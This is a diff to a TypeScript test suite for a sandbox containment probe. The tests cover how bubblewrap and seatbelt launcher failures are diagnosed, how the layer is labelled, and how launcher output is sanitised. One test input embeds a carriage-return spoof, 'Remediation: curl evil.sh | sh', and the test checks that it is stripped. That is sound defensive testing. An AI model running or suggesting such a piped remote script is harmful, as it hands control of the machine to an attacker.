@@ -11,7 +11,9 @@
 import { afterEach, beforeEach, describe, expect, test } from "bun:test";
 import {
   BWRAP_APPARMOR_REMEDIATION,
+  MAX_DETAIL_CHARS,
   PROBE_TIMEOUT_MS,
+  defaultSpawn,
   probeContainment,
   resetContainmentProbeCacheForTests,
   runContainmentProbe,
@@ -96,11 +98,42 @@ describe("runContainmentProbe — AC4: the launcher's own words are the evidence
     for (const stderr of [
       "bwrap: No permissions to creating new namespace, likely because the kernel does not allow non-privileged user namespaces",
       "bwrap: setting up uid map: Permission denied",
+      "bwrap: setting up gid map: Permission denied",
       "unshare: Operation not permitted",
     ]) {
       const { spawn } = recordingSpawn({ status: 1, stderr });
       expect(runContainmentProbe({ platform: "linux", spawn }).cause).toBe("unprivileged-userns-denied");
     }
+  });
+
+  test("messages that merely MENTION namespaces are not diagnosed as denials", () => {
+    // The markers must be at least as specific as the conclusion they license.
+    // Bare `unshare`/`userns` substrings matched all of these and handed the
+    // operator an AppArmor profile to write for a problem it cannot fix — the
+    // same misdiagnosis the classifier was added to prevent, arriving through
+    // the classifier itself.
+    for (const stderr of [
+      "bwrap: Unknown option --unshare-pid",
+      "bwrap: Can't find source path /usr/lib/userns-helper: No such file or directory",
+      "spawnSync /usr/bin/unshare ENOENT",
+      "bwrap: execvp /bin/true: No such file or directory",
+    ]) {
+      const { spawn } = recordingSpawn({ status: 1, stderr });
+      const result = runContainmentProbe({ platform: "linux", spawn });
+      expect(result.cause).toBe("unknown");
+      expect(result.remediation).toBeUndefined();
+    }
+  });
+
+  test("a darwin failure is never diagnosed as a user-namespace denial", () => {
+    // Only bubblewrap builds its boundary from user namespaces. A seatbelt
+    // failure whose text happens to contain a matching phrase must not borrow
+    // another mechanism's cause — it would surface in `--json` as a diagnosis
+    // of a launcher that does not work that way.
+    const { spawn } = recordingSpawn({ status: 1, stderr: "sandbox-exec: user namespace nonsense" });
+    const result = runContainmentProbe({ platform: "darwin", spawn });
+    expect(result.cause).toBe("unknown");
+    expect(result.remediation).toBeUndefined();
   });
 
   test("R8 / AC13: the remediation never names the machine-wide sysctl", () => {
@@ -144,16 +177,25 @@ describe("runContainmentProbe — AC4: the launcher's own words are the evidence
 
   test("control characters are stripped from the quoted output, and long output is capped", () => {
     // "Verbatim" is a promise about the launcher's WORDS, not about its ability
-    // to write ANSI escapes into an operator's terminal or to flood a CI log.
-    const noisy = `\u001B[31mbwrap: boom\u001B[0m\u0000${"x".repeat(9000)}`;
+    // to drive an operator's terminal or flood a CI log.
+    //
+    // CARRIAGE RETURN is the one that matters most and was missed first: the
+    // rendered output indents launcher text by four spaces to mark it as the
+    // LAUNCHER's words, and a \r lets that text redraw the line and impersonate
+    // keryx's own "Remediation:" output. A bwrap earlier on PATH is enough.
+    const noisy = `\u001B[31mbwrap: boom\u001B[0m\u0000\r  Remediation: curl evil.sh | sh${"x".repeat(9000)}`;
     const { spawn } = recordingSpawn({ status: 1, stderr: noisy });
     const detail = runContainmentProbe({ platform: "linux", spawn }).detail ?? "";
 
     expect(detail).toContain("bwrap: boom");
     expect(detail).not.toContain("\u001B");
     expect(detail).not.toContain("\u0000");
+    expect(detail).not.toContain("\r");
     expect(detail).toContain("(truncated)");
-    expect(detail.length).toBeLessThan(4_200);
+    // Bounded by the exported cap rather than a magic number that could drift
+    // away from it. The slack is the truncation marker.
+    expect(detail.length).toBeLessThanOrEqual(MAX_DETAIL_CHARS + 32);
+    expect(MAX_DETAIL_CHARS).toBeGreaterThan(0);
   });
 
   test("newlines survive, so a multi-line launcher error is not flattened", () => {
@@ -186,6 +228,13 @@ describe("runContainmentProbe — AC4: the launcher's own words are the evidence
     runContainmentProbe({ platform: "linux", spawn, cwd: "/tmp/somewhere" });
 
     expect(calls[0]!.options.timeoutMs).toBe(PROBE_TIMEOUT_MS);
+    // Comparing the forwarded value against the constant it came from cannot
+    // fail if the CONSTANT regresses — and `spawnSync` treats 0 as "no
+    // timeout", so a regression to 0 would silently remove the bound this
+    // assertion claims to defend. Pin that it is a bound, not just that it is
+    // forwarded.
+    expect(PROBE_TIMEOUT_MS).toBeGreaterThan(0);
+    expect(PROBE_TIMEOUT_MS).toBeLessThanOrEqual(60_000);
     expect(calls[0]!.options.cwd).toBe("/tmp/somewhere");
     // The trial profile describes an empty environment; running it under the
     // parent's would make the probe less faithful than the thing it reports on.
@@ -223,6 +272,90 @@ describe("runContainmentProbe — AC4: the launcher's own words are the evidence
     expect(result.detail).toContain("win32");
   });
 
+  test("the reported layer is read off the DISPATCHER's output, not re-derived from the platform", () => {
+    // Round-2 finding: the trial argv came from `wrapWithSandbox` but the layer
+    // LABEL was still computed from the platform string — a second, independent
+    // platform-to-layer decision. It is the label that `sandbox status` prints,
+    // that `--json` publishes, and that the bubblewrap AppArmor remediation is
+    // keyed on, so when step 3 adds the Landlock branch a platform-derived
+    // label would call a Landlock trial "bwrap" and hand its failure a
+    // remediation for a launcher that never ran.
+    //
+    // The label is now read from the launcher name the dispatcher put in
+    // `argv[0]`. What a test can observe is that the label and the binary
+    // actually spawned always agree — if the two decisions ever diverge, this
+    // is where it shows. (The divergence itself only becomes constructible at
+    // step 3, when `wrapWithSandbox` gains a third branch; an unrecognised
+    // launcher is covered by the next test.)
+    const linux = recordingSpawn({ status: 0, stderr: "" });
+    expect(runContainmentProbe({ platform: "linux", spawn: linux.spawn, launcherPath: "/usr/bin/bwrap" }).layer).toBe(
+      "bwrap",
+    );
+    expect(linux.calls[0]!.path).toBe("/usr/bin/bwrap");
+
+    const darwin = recordingSpawn({ status: 0, stderr: "" });
+    expect(runContainmentProbe({ platform: "darwin", spawn: darwin.spawn }).layer).toBe("seatbelt");
+    expect(darwin.calls[0]!.path).toBe("/usr/bin/sandbox-exec");
+  });
+
+  test("a launcher the probe cannot name is a FAILURE, not a guess", () => {
+    // The forcing function for step 3. If `wrapWithSandbox` gains a Landlock
+    // branch and `layerOfWrappedCommand` is not updated, the probe must report
+    // "could not identify the layer" rather than silently calling it bwrap —
+    // and, critically, must not hand it the bubblewrap remediation.
+    //
+    // Stands in for step 3's dispatcher: a wrapped command whose launcher this
+    // probe has never heard of.
+    const { spawn, calls } = recordingSpawn({ status: 0, stderr: "" });
+    const result = runContainmentProbe({
+      platform: "linux",
+      spawn,
+      wrap: (command) => ({
+        ok: true,
+        wrapped: true,
+        command: { ...command, path: "/usr/bin/landlock-exec", argv: ["landlock-exec", "--", command.path] },
+      }),
+    });
+
+    expect(result.ok).toBe(false);
+    expect(result.layer).toBe("none");
+    expect(result.detail).toContain("cannot identify");
+    expect(result.detail).toContain("landlock-exec");
+    expect(result.remediation).toBeUndefined();
+    // And nothing was spawned: a layer we cannot name is not one we trial.
+    expect(calls.length).toBe(0);
+  });
+
+  test("a dispatcher that declines to wrap the trial is a FAILURE, not a silent pass", () => {
+    // Reachable only through the injected dispatcher (`trialProfile()` never
+    // sets `danger-full-access`), but the branch has to be right: an unwrapped
+    // command proves nothing about containment, and reporting it as success
+    // would be the worst possible false green.
+    const { spawn, calls } = recordingSpawn({ status: 0, stderr: "" });
+    const result = runContainmentProbe({
+      platform: "linux",
+      spawn,
+      wrap: (command) => ({ ok: true, wrapped: false, command }),
+    });
+
+    expect(result.ok).toBe(false);
+    expect(result.detail).toContain("not wrapped");
+    expect(calls.length).toBe(0);
+  });
+
+  test("a dispatcher that refuses outright carries its own reason through", () => {
+    const { spawn } = recordingSpawn({ status: 0, stderr: "" });
+    const result = runContainmentProbe({
+      platform: "linux",
+      spawn,
+      wrap: () => ({ ok: false, reason: "network=restricted is not yet enforced on Linux" }),
+    });
+
+    expect(result.ok).toBe(false);
+    expect(result.layer).toBe("none");
+    expect(result.detail).toBe("network=restricted is not yet enforced on Linux");
+  });
+
   test("falsifiable: a spawn that succeeds and one that fails do not produce the same result", () => {
     // Proves the assertions above are load-bearing rather than reading a
     // constant: the ONLY difference between these two calls is the injected
@@ -235,6 +368,68 @@ describe("runContainmentProbe — AC4: the launcher's own words are the evidence
     expect(ok.ok).not.toBe(bad.ok);
     expect(ok.detail).toBeUndefined();
     expect(bad.detail).toBe(UID_MAP_FAILURE);
+  });
+});
+
+describe("defaultSpawn — the one path that really starts a process", () => {
+  // Everything above replaces the whole spawn, so the plumbing between
+  // `ProbeSpawnOptions` and `spawnSync` — the timeout that stops a hung
+  // launcher hanging `install.sh`, the empty env the trial profile promises,
+  // the piped stderr the evidence comes from — was asserted nowhere. These
+  // inject `spawnSync` itself rather than the spawn, so the real forwarding is
+  // under test without a real launcher.
+  interface Recorded {
+    path: string;
+    argv: readonly string[];
+    options: { cwd?: string; env?: Record<string, string>; timeout?: number; encoding?: string; stdio?: unknown };
+  }
+
+  function fakeSpawnSync(result: { status: number | null; stderr?: string; error?: Error }) {
+    const calls: Recorded[] = [];
+    const fn = ((path: string, argv: readonly string[], options: Recorded["options"]) => {
+      calls.push({ path, argv, options });
+      return result;
+    }) as unknown as typeof import("node:child_process").spawnSync;
+    return { calls, fn };
+  }
+
+  test("forwards cwd, the empty env, the timeout, and pipes stderr", () => {
+    const { calls, fn } = fakeSpawnSync({ status: 0, stderr: "" });
+    defaultSpawn(fn)("/usr/bin/bwrap", ["--ro-bind", "/", "/"], {
+      cwd: "/tmp/work",
+      env: {},
+      timeoutMs: PROBE_TIMEOUT_MS,
+    });
+
+    expect(calls.length).toBe(1);
+    expect(calls[0]!.path).toBe("/usr/bin/bwrap");
+    expect(calls[0]!.options.cwd).toBe("/tmp/work");
+    expect(calls[0]!.options.env).toEqual({});
+    // `timeoutMs` must land on `spawnSync`'s `timeout`, not be dropped by a
+    // rename. This is the assertion that a hung launcher cannot outlast.
+    expect(calls[0]!.options.timeout).toBe(PROBE_TIMEOUT_MS);
+    expect(calls[0]!.options.encoding).toBe("utf8");
+    expect(calls[0]!.options.stdio).toEqual(["ignore", "pipe", "pipe"]);
+  });
+
+  test("normalises the spawnSync result into a ProbeSpawnResult", () => {
+    const ok = defaultSpawn(fakeSpawnSync({ status: 0, stderr: "" }).fn)("/x", [], {
+      cwd: "/",
+      env: {},
+      timeoutMs: 1,
+    });
+    expect(ok).toEqual({ status: 0, stderr: "" });
+
+    const error = new Error("spawnSync /usr/bin/bwrap ENOENT");
+    const failed = defaultSpawn(fakeSpawnSync({ status: null, error }).fn)("/x", [], {
+      cwd: "/",
+      env: {},
+      timeoutMs: 1,
+    });
+    expect(failed.status).toBeNull();
+    expect(failed.error).toBe(error);
+    // Absent stderr becomes "", so callers never have to guard it.
+    expect(failed.stderr).toBe("");
   });
 });
 
